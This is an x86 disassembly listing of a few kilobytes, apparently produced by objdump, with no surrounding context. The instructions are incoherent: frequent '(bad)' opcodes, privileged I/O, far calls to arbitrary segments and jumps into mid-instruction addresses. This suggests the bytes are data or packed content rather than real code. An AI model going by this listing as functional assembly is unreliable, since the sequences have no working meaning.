  411705:	jmp    DWORD PTR [edx-0x2615356]
  41170b:	out    0x84,al
  41170d:	push   es
  41170e:	jle    0x4116cf
  411710:	dec    esi
  411711:	cmp    cl,BYTE PTR [esi-0x7fae841e]
  411717:	pop    eax
  411718:	jne    0x411797
  41171a:	xor    ecx,ecx
  41171c:	stc    
  41171d:	mov    ds:0x18dd9482,ax
  411723:	ins    BYTE PTR es:[edi],dx
  411724:	(bad)  
  411725:	sub    BYTE PTR [esi-0x4e882d4d],ah
  41172b:	call   0x82540872
  411730:	sub    ch,dl
  411732:	sbb    al,0x5b
  411734:	xchg   DWORD PTR [eax+0x1c37629b],esi
  41173a:	sahf   
  41173b:	jg     0x41173e
  41173d:	jg     0x4116f7
  41173f:	jb     0x411717
  411741:	cdq    
  411742:	push   edi
  411743:	fidivr WORD PTR [eax-0x62fb0ee9]
  411749:	pusha  
  41174a:	jge    0x4116ec
  41174c:	xor    edx,ebp
  41174e:	nop
  41174f:	mov    ch,0x4d
  411751:	ds add bl,cl
  411754:	sbb    eax,0xf1cccef9
  411759:	stos   BYTE PTR es:[edi],al
  41175a:	cld    
  41175b:	aam    0x53
  41175d:	inc    edx
  41175e:	xchg   esi,eax
  41175f:	dec    eax
  411760:	ror    esi,0x14
  411763:	shl    DWORD PTR [eax+0x3d],1
  411766:	das    
  411767:	sar    WORD PTR [edx],cl
  41176a:	lahf   
  41176b:	jne    0x411747
  41176d:	bound  edi,QWORD PTR [esi]
  41176f:	push   0x42d88bef
  411774:	in     eax,dx
  411775:	adc    bl,BYTE PTR [esi-0x36f7352e]
  41177b:	sbb    eax,0xd3c6d570
  411780:	sti    
  411781:	push   0xedabc970
  411786:	aad    0x4c
  411788:	add    eax,0xf658aa3a
  41178d:	(bad)  
  41178f:	out    0xfa,al
  411791:	and    bl,al
  411793:	mov    WORD PTR [ebp+0x152c9005],cs
  411799:	or     eax,0xc2554e6b
  41179e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41179f:	pop    es
  4117a0:	pop    ds
  4117a1:	mov    edx,0x8fbd9117
  4117a6:	das    
  4117a7:	out    dx,eax
  4117a8:	into   
  4117a9:	push   ebx
  4117aa:	retf   
  4117ab:	and    eax,0x97e0decd
  4117b0:	and    eax,0x91c8320f
  4117b5:	iret   
  4117b6:	mov    bl,0x73
  4117b8:	inc    ebp
  4117b9:	retf   
  4117ba:	rcr    BYTE PTR [ebx-0x1f67b0ba],cl
  4117c0:	test   eax,0x6705bb11
  4117c5:	jne    0x411800
  4117c7:	(bad)  
  4117c8:	fstp   QWORD PTR [edi+0x1b4a9f8d]
  4117ce:	adc    dl,0xc6
  4117d1:	loop   0x4117d3
  4117d3:	jnp    0x4117ba
  4117d5:	xor    eax,0x1248bd27
  4117da:	ret    
  4117db:	(bad)  [esi-0x3b]
  4117de:	dec    edi
  4117df:	mov    ah,0x8d
  4117e1:	push   ds
  4117e2:	test   eax,0xae677f9b
  4117e7:	scas   al,BYTE PTR es:[edi]
  4117e8:	pop    es
  4117e9:	in     al,0xca
  4117eb:	push   es
  4117ec:	dec    edi
  4117ed:	lods   al,BYTE PTR ds:[esi]
  4117ee:	sbb    ch,al
  4117f0:	sbb    ah,dl
  4117f2:	and    BYTE PTR [ecx+0xdac7333],0x58
  4117f9:	(bad)  
  4117fa:	hlt    
  4117fb:	lock (bad) 
  4117fd:	repz inc eax
  4117ff:	(bad)  
  411800:	arpl   WORD PTR [edi-0x62fd550f],si
  411806:	and    dh,bl
  411808:	jne    0x41187e
  41180a:	dec    ebp
  41180b:	dec    esp
  41180c:	and    DWORD PTR [edx-0x482afe96],edi
  411812:	xor    dh,BYTE PTR [edx-0x4012b6a3]
  411818:	sbb    edx,DWORD PTR [eax]
  41181a:	or     al,0x16
  41181c:	jb     0x4117c6
  41181e:	add    al,0x2c
  411820:	pop    ds
  411821:	in     eax,dx
  411822:	jbe    0x41181e
  411824:	shr    BYTE PTR [ecx-0x7b],0x57
  411828:	inc    edi
  411829:	jnp    0x4117f8
  41182b:	ret    0x76f
  41182e:	and    DWORD PTR [eax],eax
  411830:	mov    eax,0xbf49f308
  411835:	arpl   sp,ax
  411837:	add    BYTE PTR [ecx-0x6a],bh
  41183a:	mov    al,0x58
  41183c:	loope  0x411804
  41183e:	ret    
  41183f:	imul   ebp,DWORD PTR [ecx-0x56a43f21],0x6f15631
  411849:	sbb    ebp,DWORD PTR [edx+0x4c277161]
  41184f:	adc    eax,0xb68353a9
  411854:	and    al,0xe5
  411856:	daa    
  411857:	ins    BYTE PTR es:[edi],dx
  411858:	xor    al,0x3
  41185a:	jns    0x411859
  41185c:	fcom   DWORD PTR [ebp+0x6dbde573]
  411862:	sub    esp,edi
  411864:	lahf   
  411865:	pop    esi
  411866:	popa   
  411867:	cld    
  411868:	cli    
  411869:	sbb    cl,BYTE PTR ds:0xf8bf3fe
  41186f:	pop    ds
  411870:	test   eax,0xa1209300
  411875:	outs   dx,BYTE PTR ds:[esi]
  411876:	mov    edx,0xaee3bc85
  41187b:	inc    ebx
  41187c:	jmp    0x411805
  41187e:	add    al,0x60
  411880:	jp     0x4118b1
  411882:	ss xchg ebp,eax
  411884:	jb     0x4118eb
  411886:	sub    bl,BYTE PTR [ebx-0x7e4f3dcf]
  41188c:	into   
  41188d:	mov    eax,ds:0x97c44a15
  411892:	jne    0x4118de
  411894:	push   ebp
  411895:	sub    esi,esp
  411897:	ja     0x41182f
  411899:	xchg   dh,ch
  41189b:	jle    0x411907
  41189d:	stos   DWORD PTR es:[edi],eax
  41189e:	clc    
  41189f:	push   esp
  4118a0:	mov    dl,0xec
  4118a2:	adc    cl,BYTE PTR ds:0x8a2908d6
  4118a8:	iret   
  4118a9:	idiv   DWORD PTR [edi-0x5]
  4118ac:	sub    DWORD PTR [esi-0x17],ebx
  4118af:	fsub   QWORD PTR [edi+ebx*4-0x5076df9a]
  4118b6:	sahf   
  4118b7:	aad    0xd
  4118b9:	(bad)  
  4118ba:	scas   eax,DWORD PTR es:[edi]
  4118bb:	cmp    DWORD PTR [edi],edi
  4118bd:	inc    edi
  4118be:	or     al,0x4b
  4118c0:	iret   
  4118c1:	inc    eax
  4118c2:	fwait
  4118c3:	push   ebp
  4118c4:	mov    cl,bl
  4118c6:	ja     0x411913
  4118c8:	leave  
  4118c9:	shr    dl,1
  4118cb:	jne    0x411944
  4118cd:	fimul  WORD PTR [edi]
  4118cf:	adc    al,0x79
  4118d1:	push   esi
  4118d2:	lea    edi,[ecx-0x5d45f901]
  4118d8:	or     eax,esi
  4118da:	mov    dl,0x32
  4118dc:	out    dx,eax
  4118dd:	cdq    
  4118de:	ficom  DWORD PTR [ebp-0x2c6ec88b]
  4118e4:	stc    
  4118e5:	jle    0x41186f
  4118e7:	ret    0xadf6
  4118ea:	ret    0x2731
  4118ed:	dec    esi
  4118ee:	aaa    
  4118ef:	push   ss
  4118f0:	jb     0x4118f1
  4118f2:	dec    edx
  4118f3:	or     ebp,DWORD PTR [esi+0x54]
  4118f6:	xchg   esi,eax
  4118f7:	inc    ebx
  4118f8:	jmp    0xd3ca3ab8
  4118fd:	pop    es
  4118fe:	or     bh,BYTE PTR [edx+0x596c3d44]
  411904:	mov    dh,0x70
  411906:	xchg   edi,eax
  411907:	leave  
  411908:	jp     0x4118ca
  41190a:	inc    ebx
  41190b:	js     0x411975
  41190d:	lods   al,BYTE PTR ds:[esi]
  41190e:	mov    bh,0x59
  411910:	dec    ebp
  411911:	cmp    DWORD PTR [edx-0x34],esp
  411914:	or     ch,BYTE PTR ds:0xdecf4b0e
  41191a:	mov    BYTE PTR [edi+0x47ee67ee],0x10
  411921:	ins    BYTE PTR es:[edi],dx
  411922:	(bad)  
  411923:	int    0xe7
  411925:	push   ebp
  411926:	rcr    edx,cl
  411928:	and    BYTE PTR [eax+0x4afc7aee],0x9
  41192f:	(bad)  [edx+0x4a69c0c5]
  411935:	xlat   BYTE PTR ds:[ebx]
  411936:	push   eax
  411937:	sub    BYTE PTR ds:0x38d1d7bc,cl
  41193d:	push   ds
  41193e:	push   cs
  41193f:	dec    esp
  411940:	xchg   ecx,eax
  411941:	and    eax,0x5739ed2a
  411946:	les    ebp,FWORD PTR [ebx+eiz*1+0x7b]
  41194a:	jo     0x41193d
  41194c:	cmp    ah,BYTE PTR [esi-0x63]
  41194f:	pushf  
  411950:	cmc    
  411951:	adc    esp,DWORD PTR [edx+0x60]
  411954:	inc    eax
  411955:	jp     0x41195b
  411957:	aam    0x4c
  411959:	mov    ds,eax
  41195b:	jno    0x411904
  41195d:	add    eax,0xafeb715e
  411962:	mov    es,WORD PTR [ecx-0x9ed858d]
  411968:	dec    ebx
  411969:	mov    eax,ebx
  41196b:	push   dx
  41196d:	test   eax,0x537d85b
  411972:	mov    dh,cl
  411974:	(bad)  
  411975:	jno    0x411974
  411977:	repnz inc esp
  411979:	xchg   edx,eax
  41197a:	(bad)  
  41197b:	mov    dh,0x90
  41197d:	adc    al,0xa7
  41197f:	or     esp,esi
  411981:	retf   
  411982:	cld    
  411983:	(bad)  
  411984:	addr16 call 0x5b18:0xbae258da
  41198c:	sbb    DWORD PTR [ebx-0x21839352],ebx
  411992:	sub    ecx,DWORD PTR [edi]
  411994:	push   ecx
  411995:	loopne 0x41199e
  411997:	or     cl,BYTE PTR [ebx+edx*1-0x5eee840e]
  41199e:	dec    eax
  41199f:	xlat   BYTE PTR ds:[ebx]
  4119a0:	sub    ch,BYTE PTR [edx]
  4119a2:	sbb    eax,0x6b4f4868
  4119a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119a8:	push   esi
  4119a9:	lahf   
  4119aa:	xor    al,0xb8
  4119ac:	sbb    ch,BYTE PTR [esi-0xcb2b84e]
  4119b2:	cmp    al,0x10
  4119b4:	test   eax,0xeeb7bde1
  4119b9:	xchg   ebp,eax
  4119ba:	cs out 0x82,eax
  4119bd:	dec    DWORD PTR [edx+0x3]
  4119c0:	fcomp  QWORD PTR [ecx+0x34aa4e4e]
  4119c6:	inc    ebx
  4119c7:	jle    0x41197d
  4119c9:	js     0x411977
  4119cb:	xor    BYTE PTR [ebp+0xb4f285f],0x6c
  4119d2:	cmp    ah,BYTE PTR [edi]
  4119d4:	xchg   ebp,eax
  4119d5:	sub    BYTE PTR [esi-0x37],cl
  4119d8:	gs in  eax,dx
  4119da:	sbb    BYTE PTR [ebx+0x32],al
  4119dd:	xchg   edx,eax
  4119de:	push   0x5eb7077c
  4119e3:	out    dx,eax
  4119e4:	lods   eax,DWORD PTR ds:[esi]
  4119e5:	icebp  
  4119e6:	pop    ecx
  4119e7:	and    cl,BYTE PTR [ebp+eiz*2-0x41]
  4119eb:	or     al,0xa0
  4119ed:	inc    ecx
  4119ee:	push   0x40
  4119f0:	fistp  WORD PTR [eax+0x56]
  4119f3:	xacquire xchg BYTE PTR [edi-0x20],bl
  4119f7:	shr    BYTE PTR [eax-0x2aa7d1bd],1
  4119fd:	mov    DWORD PTR [esi+0x6d],0xaae840e5
  411a04:	mov    ecx,0x5968c380
  411a09:	jecxz  0x4119bc
  411a0b:	out    dx,eax
  411a0c:	in     al,0x5c
  411a0e:	pop    eax
  411a0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a10:	mov    eax,ebx
  411a12:	js     0x411a68
  411a14:	adc    eax,DWORD PTR [esi+0x202b2717]
  411a1a:	icebp  
  411a1b:	jecxz  0x411a56
  411a1d:	inc    edi
  411a1e:	stos   BYTE PTR es:[edi],al
  411a1f:	ss loope 0x4119a9
  411a22:	popa   
  411a23:	push   cs
  411a24:	and    al,0x67
  411a26:	lods   al,BYTE PTR ds:[esi]
  411a27:	stos   BYTE PTR es:[edi],al
  411a28:	pop    esp
  411a29:	xor    cl,bl
  411a2b:	xchg   esi,eax
  411a2c:	sub    eax,0x20e55d54
  411a31:	cld    
  411a32:	sbb    eax,0x2d3c59fa
  411a37:	and    BYTE PTR [esi-0x7cf834c0],dh
  411a3d:	dec    esi
  411a3e:	outs   dx,DWORD PTR ds:[esi]
  411a3f:	in     al,0x92
  411a41:	jecxz  0x411a25
  411a43:	or     eax,0x7a461eb0
  411a48:	cmp    BYTE PTR [eax-0x73],0x9
  411a4c:	push   es
  411a4d:	cs push edi
  411a4f:	jnp    0x411a9b
  411a51:	mov    esp,0x408c33b6
  411a56:	push   es
  411a57:	arpl   WORD PTR [eax-0x1e],cx
  411a5a:	cmp    ebx,ecx
  411a5c:	std    
  411a5d:	out    dx,al
  411a5e:	cmp    dh,BYTE PTR [edi+0x77]
  411a61:	mov    ecx,0x9c283870
  411a66:	pusha  
  411a67:	push   edx
  411a68:	popf   
  411a69:	inc    esi
  411a6a:	js     0x411a0b
  411a6c:	mov    edx,0xa927fc0b
  411a71:	(bad)  
  411a72:	(bad)  
  411a73:	neg    DWORD PTR [eax]
  411a75:	rep outs dx,DWORD PTR ds:[esi]
  411a77:	imul   edi,DWORD PTR [ecx-0x67d3530d],0x2e
  411a7e:	sbb    ah,BYTE PTR [ecx+0x30]
  411a81:	pop    es
  411a82:	(bad)  
  411a83:	jb     0x411a12
  411a85:	or     eax,0xd3af50f1
  411a8a:	test   eax,0x6d08478c
  411a8f:	mov    ss,ebx
  411a91:	xor    esi,DWORD PTR [edi]
  411a93:	loop   0x411a4b
  411a95:	inc    ebx
  411a96:	stos   BYTE PTR es:[edi],al
  411a97:	mov    ds:0x91b9ae57,al
  411a9c:	or     al,dh
  411a9e:	pop    ds
  411a9f:	je     0x411a3f
  411aa1:	push   ebx
  411aa2:	int    0xa3
  411aa4:	sbb    dl,BYTE PTR [eax-0x67adfe9d]
  411aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aab:	mov    ecx,0x877f5185
  411ab0:	loope  0x411a7e
  411ab2:	mov    bh,0x5a
  411ab4:	cmp    eax,0xda5ad91c
  411ab9:	scas   eax,DWORD PTR es:[edi]
  411aba:	cs imul ecx,esi,0x1bc3304
  411ac1:	loop   0x411a4f
  411ac3:	lods   eax,DWORD PTR ds:[esi]
  411ac4:	pop    ecx
  411ac5:	dec    ebx
  411ac6:	inc    ebx
  411ac7:	loopne 0x411ac0
  411ac9:	in     eax,dx
  411aca:	mov    cl,0xd7
  411acc:	icebp  
  411acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ace:	mov    DWORD PTR [eax],esi
  411ad0:	out    dx,eax
  411ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ad2:	inc    esp
  411ad3:	inc    edi
  411ad4:	xor    bh,ah
  411ad6:	sub    edx,eax
  411ad8:	and    BYTE PTR [esi+0x273e3379],dl
  411ade:	cli    
  411adf:	out    dx,eax
  411ae0:	into   
  411ae1:	ret    
  411ae2:	lods   eax,DWORD PTR ds:[esi]
  411ae3:	in     al,dx
  411ae4:	in     al,dx
  411ae5:	mov    ebx,0xa83461d2
  411aea:	xchg   ebx,eax
  411aeb:	dec    edi
  411aec:	(bad)  [ebx+0x5b]
  411aef:	push   0x65
  411af1:	in     eax,0x35
  411af3:	lahf   
  411af4:	or     eax,0x62f37a7
  411af9:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  411afb:	fs fwait
  411afd:	popf   
  411afe:	jae    0x411ad0
  411b00:	ja     0x411b1f
  411b02:	aas    
  411b03:	imul   edx,DWORD PTR [ebx-0x18],0x61ebc6e2
  411b0a:	mov    esi,es
  411b0c:	(bad)  
  411b0d:	mov    gs:0xe37da56c,al
  411b13:	pop    esi
  411b14:	push   ecx
  411b15:	outs   dx,BYTE PTR ds:[esi]
  411b16:	(bad)  
  411b17:	push   edx
  411b18:	xor    eax,esi
  411b1a:	adc    eax,0x4f113cba
  411b1f:	pop    esi
  411b20:	sbb    bh,ah
  411b22:	jne    0x411b13
  411b24:	xchg   ebx,eax
  411b25:	mov    dh,0x9b
  411b27:	repnz mov ecx,0x15fc8a90
  411b2d:	pop    edi
  411b2e:	imul   edx,DWORD PTR [edx+0x66],0x2e50c4b9
  411b35:	add    al,0x95
  411b37:	sar    BYTE PTR [eax+0x81d6862],1
  411b3d:	mov    edx,0xa8aa103d
  411b42:	fsubr  DWORD PTR [eax+eiz*2+0x56]
  411b46:	cmp    al,0x12
  411b48:	shl    DWORD PTR [esi-0x59779a22],1
  411b4e:	out    0xc8,eax
  411b50:	(bad)  
  411b51:	cli    
  411b52:	xor    DWORD PTR [ecx-0x7d121751],edx
  411b58:	mov    esp,0xd5abe403
  411b5d:	inc    ebx
  411b5e:	out    dx,al
  411b5f:	cmp    al,0xc4
  411b61:	sub    bl,BYTE PTR [eax-0x7403a235]
  411b67:	test   ebp,ebx
  411b69:	push   ebx
  411b6a:	and    eax,0xf47c9dfd
  411b6f:	(bad)  [ebp+0x1a1f587c]
  411b75:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  411b77:	pop    esi
  411b78:	cmp    eax,0xbffd96c3
  411b7d:	inc    ecx
  411b7e:	aaa    
  411b7f:	jmp    0x85891910
  411b84:	push   ds
  411b85:	and    ebx,esp
  411b87:	pop    ecx
  411b88:	push   eax
  411b89:	pop    es
  411b8a:	int    0x95
  411b8c:	std    
  411b8d:	push   ss
  411b8e:	out    0x8b,al
  411b90:	or     ebp,ecx
  411b92:	xchg   edi,eax
  411b93:	test   al,0xe0
  411b95:	fistp  DWORD PTR [ebx+0x3]
  411b98:	push   0xcd33f88c
  411b9d:	sbb    eax,0xc0028d4b
  411ba2:	retf   0xd7a4
  411ba5:	push   0xffffffc3
  411ba7:	jnp    0x411beb
  411ba9:	mov    cs,esp
  411bab:	sbb    eax,0x4fa8c02
  411bb0:	or     ecx,DWORD PTR [esi-0x720c2a15]
  411bb6:	fcmovbe st,st(3)
  411bb8:	ins    DWORD PTR es:[edi],dx
  411bb9:	adc    edx,ecx
  411bbb:	shl    esp,cl
  411bbd:	mov    ecx,0x8ab16ae1
  411bc2:	adc    ebx,ecx
  411bc4:	pop    es
  411bc5:	dec    ecx
  411bc6:	into   
  411bc7:	inc    ecx
  411bc8:	xchg   esp,eax
  411bc9:	adc    eax,0x70a9e3c
  411bce:	push   0xffffffae
  411bd0:	sub    ebp,eax
  411bd2:	fcomp  DWORD PTR ds:0x200fe373
  411bd8:	inc    esi
  411bd9:	mov    edi,0xeb347b9a
  411bde:	push   ss
  411bdf:	loopne 0x411b61
  411be1:	ror    DWORD PTR [eax-0x47e243ca],0xc9
  411be8:	pop    edi
  411be9:	pop    edx
  411bea:	lock lock inc edx
  411bed:	jo     0x411b8f
  411bef:	cs lock int3 
  411bf2:	fiadd  WORD PTR [edi+0x70]
  411bf5:	enter  0xc0d3,0x2d
  411bf9:	or     bh,ah
  411bfb:	call   0x7dad3f4e
  411c00:	pop    ebp
  411c01:	jns    0x411b85
  411c03:	jne    0x411c5f
  411c05:	pop    es
  411c06:	(bad)  
  411c07:	call   0x18e3:0xaaf12a7a
  411c0e:	cs mov dl,0x1
  411c11:	sbb    al,BYTE PTR [ecx-0x62]
  411c14:	ror    DWORD PTR [ecx+0x44],0x7b
  411c18:	cmp    ch,bh
  411c1a:	pop    ebp
  411c1b:	aaa    
  411c1c:	add    esi,DWORD PTR [edx]
  411c1e:	in     al,dx
  411c1f:	inc    esi
  411c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c21:	mov    bh,BYTE PTR [eax+edi*8-0xd189f4b]
  411c28:	retf   
  411c29:	fwait
  411c2a:	std    
  411c2b:	mov    dh,BYTE PTR [ecx]
  411c2d:	std    
  411c2e:	lds    ecx,FWORD PTR [eax-0x7fa8333]
  411c34:	adc    bh,dh
  411c36:	ds xchg edi,eax
  411c38:	aad    0x2d
  411c3a:	dec    ebp
  411c3b:	les    edi,FWORD PTR [edx+0x5c]
  411c3e:	sbb    ebx,DWORD PTR [ebx]
  411c40:	fs (bad) 
  411c42:	mov    dh,0xe0
  411c44:	mov    edi,0x9de1756d
  411c49:	repz clc 
  411c4b:	dec    esi
  411c4c:	sub    DWORD PTR [edi+0x65442b26],0xfffffff7
  411c53:	popa   
  411c54:	or     eax,esi
  411c56:	and    bl,BYTE PTR [ebx]
  411c58:	push   cs
  411c59:	adc    BYTE PTR [eax],al
  411c5b:	add    al,0x9a
  411c5d:	enter  0x2417,0x69
  411c61:	ror    DWORD PTR [ebx+0x72],cl
  411c64:	cld    
  411c65:	in     al,0x25
  411c67:	cmp    dl,BYTE PTR [ebx-0x4e81fc21]
  411c6d:	dec    eax
  411c6e:	cld    
  411c6f:	sub    ebp,ebx
  411c71:	mov    ebp,0x45bf0e38
  411c76:	ret    0xaefb
  411c79:	mov    DWORD PTR [eax+0x6c],ecx
  411c7c:	mov    ds:0x14ff506c,al
  411c81:	cdq    
  411c82:	cmp    al,0x13
  411c84:	push   esi
  411c85:	mov    al,0xa0
  411c87:	pop    ebp
  411c88:	cld    
  411c89:	xchg   ecx,eax
  411c8a:	cmp    esp,esi
  411c8c:	hlt    
  411c8d:	cmp    ch,BYTE PTR [ebx+0x25]
  411c90:	inc    esi
  411c91:	xchg   ecx,eax
  411c92:	adc    al,0xb9
  411c94:	adc    ebx,edx
  411c96:	hlt    
  411c97:	inc    esp
  411c98:	neg    BYTE PTR [edx-0x589a1333]
  411c9e:	retf   
  411c9f:	fist   DWORD PTR [edx]
  411ca1:	sbb    bl,BYTE PTR [esi-0x4b]
  411ca4:	jecxz  0x411c9a
  411ca6:	nop
  411ca7:	inc    ebx
  411ca8:	sub    al,0xaf
  411caa:	pusha  
  411cab:	cmp    al,0x9c
  411cad:	or     esi,DWORD PTR [ecx-0x1707398e]
  411cb3:	test   eax,0xfa4083fc
  411cb8:	fwait
  411cb9:	mov    ch,0xdb
  411cbb:	loop   0x411d0c
  411cbd:	mov    DWORD PTR [ebp+0x2e],edi
  411cc0:	sbb    eax,0x29f8bc0d
  411cc5:	add    esp,ebx
  411cc7:	popa   
  411cc8:	cmp    eax,0x5a3d8e71
  411ccd:	mov    eax,0x5d5384fb
  411cd2:	xchg   ebp,eax
  411cd3:	pop    edx
  411cd4:	cmovno esi,DWORD PTR [eax-0x72e342f5]
  411cdb:	or     ecx,esi
  411cdd:	arpl   ax,bx
  411cdf:	sbb    dh,BYTE PTR [eax+0x5f]
  411ce2:	mov    esi,es
  411ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ce5:	xlat   BYTE PTR ds:[ebx]
  411ce6:	fcom   st(1)
  411ce8:	or     al,0x6e
  411cea:	mov    ah,0x75
  411cec:	add    esi,DWORD PTR [edx+0x3f04fed6]
  411cf2:	jle    0x411d6f
  411cf4:	sbb    DWORD PTR [ecx],ebp
  411cf6:	fsub   st,st(1)
  411cf8:	sub    ebx,DWORD PTR [eax+0x3f624e1e]
  411cfe:	retf   0x47c0
  411d01:	into   
  411d02:	repz mov bh,0x6b
  411d05:	xor    al,0x2d
  411d07:	sub    eax,0xdec87056
  411d0c:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d0e:	sti    
  411d0f:	dec    ebp
  411d10:	and    bh,BYTE PTR [ebx]
  411d12:	mov    esp,0x4a6e0d9b
  411d17:	xchg   DWORD PTR [ebx+ebx*1+0x29fc27ac],edi
  411d1e:	loop   0x411cde
  411d20:	out    dx,al
  411d21:	stc    
  411d22:	or     ah,BYTE PTR [edi+0x6216ecca]
  411d28:	mov    dh,0xbd
  411d2a:	pop    ss
  411d2b:	push   es
  411d2c:	mov    al,0x61
  411d2e:	jno    0x411d83
  411d30:	add    eax,0x39f9ea2
  411d35:	adc    al,0xa0
  411d37:	jae    0x411d27
  411d39:	loope  0x411d2d
  411d3b:	fdiv   QWORD PTR [ecx]
  411d3d:	sub    al,0x25
  411d3f:	popf   
  411d40:	call   0xf2e3f184
  411d45:	imul   eax,edi,0x69
  411d48:	mov    ecx,0x3adff215
  411d4d:	sub    DWORD PTR [esi-0x1788da05],0x27d14d49
  411d57:	mov    bl,0x78
  411d59:	push   edi
  411d5a:	cwde   
  411d5b:	mul    BYTE PTR [ebp+0xa]
  411d5e:	xchg   esi,eax
  411d5f:	push   es
  411d60:	mov    dh,0xbd
  411d62:	jl     0x411ce4
  411d64:	jg     0x411d88
  411d66:	stos   BYTE PTR es:[edi],al
  411d67:	stos   BYTE PTR es:[edi],al
  411d68:	cli    
  411d69:	stos   DWORD PTR es:[edi],eax
  411d6a:	mov    al,0x6f
  411d6c:	mov    WORD PTR [eax],gs
  411d6e:	(bad)  
  411d6f:	out    dx,eax
  411d70:	lock pop esp
  411d72:	mov    edx,0xdd69b125
  411d77:	push   edi
  411d78:	cmp    al,0x1a
  411d7a:	mov    WORD PTR [esi-0x36],es
  411d7d:	add    al,0x2d
  411d7f:	xchg   edi,eax
  411d81:	or     DWORD PTR [edx+0x22],ecx
  411d84:	sub    BYTE PTR [esp+edi*1-0x46],0xe8
  411d89:	mov    esp,0x4eec576
  411d8e:	mov    WORD PTR [ebp+0x77],fs
  411d91:	or     dh,BYTE PTR [ebx]
  411d93:	cld    
  411d94:	call   0x9cdb:0x4ab34cbe
  411d9b:	xor    dh,BYTE PTR [esi-0x16]
  411d9e:	pop    ds
  411d9f:	and    DWORD PTR [ecx+0x7e],ecx
  411da2:	dec    esi
  411da3:	aaa    
  411da4:	add    al,BYTE PTR [esi+eax*8+0x42259ee2]
  411dab:	stos   BYTE PTR es:[edi],al
  411dac:	arpl   WORD PTR [edi],sp
  411dae:	and    BYTE PTR [ebx+0x6a],al
  411db1:	mov    ds:0xc41e600,al
  411db6:	int3   
  411db7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411db8:	enter  0x6b0f,0xe1
  411dbc:	mov    ds,WORD PTR [esi+eax*8+0x64f5b8fc]
  411dc3:	iret   
  411dc4:	sbb    ah,ah
  411dc6:	dec    ecx
  411dc7:	xchg   BYTE PTR [esi+ecx*2],dl
  411dca:	jmp    0xe36b:0x80e82472
  411dd1:	ss addr16 cmp esi,ebp
  411dd5:	and    DWORD PTR ds:0x15d88e31,ecx
  411ddb:	inc    ebp
  411ddc:	and    BYTE PTR [ecx-0x49],bh
  411ddf:	push   0x9a337c29
  411de4:	cmp    DWORD PTR [edx],edx
  411de6:	xchg   edi,eax
  411de7:	jns    0x411d7d
  411de9:	cmp    bh,BYTE PTR [edx+0x2f]
  411dec:	or     ch,BYTE PTR [ebx]
  411dee:	mov    dh,0x8f
  411df0:	lods   eax,DWORD PTR ds:[esi]
  411df1:	pop    edx
  411df2:	loope  0x411e02
  411df4:	pop    es
  411df5:	xor    esi,DWORD PTR [eax]
  411df7:	mov    ds:0x4b61871e,eax
  411dfc:	aad    0x1
  411dfe:	ins    BYTE PTR es:[edi],dx
  411dff:	lds    ebx,FWORD PTR [esi]
  411e01:	shl    DWORD PTR [ebx-0x6b],cl
  411e04:	cmc    
  411e05:	(bad)  
  411e07:	(bad)  
  411e08:	jns    0x411d97
  411e0a:	int    0x3a
  411e0c:	xchg   ebp,eax
  411e0d:	inc    esi
  411e0e:	jno    0x411dc5
  411e10:	das    
  411e11:	imul   ebp,DWORD PTR [ebp+0x6bbc7de2],0xffffffef
  411e18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e19:	dec    eax
  411e1a:	adc    BYTE PTR [eax-0x686af495],cl
  411e20:	pushf  
  411e21:	adc    DWORD PTR [ecx-0x3e],eax
  411e24:	push   ds
  411e25:	aam    0x47
  411e27:	mov    cs,WORD PTR [esi+0x18]
  411e2a:	ret    
  411e2b:	dec    esp
  411e2c:	xchg   BYTE PTR [ebx],ch
  411e2e:	sub    DWORD PTR [ebx],edx
  411e30:	call   0xd12ecff0
  411e35:	push   es
  411e36:	jl     0x411eab
  411e38:	push   esp
  411e39:	xor    ebx,esp
  411e3b:	push   0x503e69fd
  411e40:	sbb    cl,BYTE PTR [ebp-0x57]
  411e43:	in     eax,0xe9
  411e45:	idiv   DWORD PTR [ebp+0x5f2de33d]
  411e4b:	cs xchg esp,eax
  411e4d:	fwait
  411e4e:	stos   DWORD PTR es:[edi],eax
  411e4f:	iret   
  411e50:	ins    BYTE PTR es:[edi],dx
  411e51:	(bad)  
  411e52:	out    dx,eax
  411e53:	add    cl,ch
  411e55:	xor    al,0x21
  411e57:	jmp    0x17cfd91d
  411e5c:	repnz call 0x1620:0xd9b35c7c
  411e64:	xchg   dh,bh
  411e66:	inc    ebx
  411e67:	mov    bh,BYTE PTR [edi-0x7861a056]
  411e6d:	mov    ecx,?
  411e6f:	inc    esp
  411e70:	adc    eax,0xaf159611
  411e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e76:	lea    edx,[edx+0x63]
  411e79:	fldln2 
  411e7b:	aad    0x6c
  411e7d:	mov    ebx,0x9346b48e
  411e82:	sub    BYTE PTR [ebx-0x56],dh
  411e85:	in     al,dx
  411e86:	jp     0x411efc
  411e88:	xor    DWORD PTR [eax-0x8],0xffffffac
  411e8c:	ja     0x411e62
  411e8e:	inc    esi
  411e8f:	lea    edx,[ebp+0x7dd91270]
  411e95:	fiadd  DWORD PTR [ecx+0x4a15cd5d]
  411e9b:	sbb    BYTE PTR [ebp-0x217791f4],bl
  411ea1:	push   edx
  411ea2:	adc    eax,0x61389ed1
  411ea7:	ret    
  411ea8:	mov    eax,edx
  411eaa:	popa   
  411eab:	arpl   bp,di
  411ead:	mov    ch,0xd9
  411eaf:	fiadd  WORD PTR [edx+eax*2]
  411eb2:	sbb    eax,0xe398255d
  411eb7:	adc    DWORD PTR [ebp+0x4e],esi
  411eba:	xor    eax,eax
  411ebc:	scas   eax,DWORD PTR es:[edi]
  411ebd:	add    ah,BYTE PTR [esi-0x572a939e]
  411ec3:	cmp    BYTE PTR [ebx-0x22],dh
  411ec6:	out    dx,al
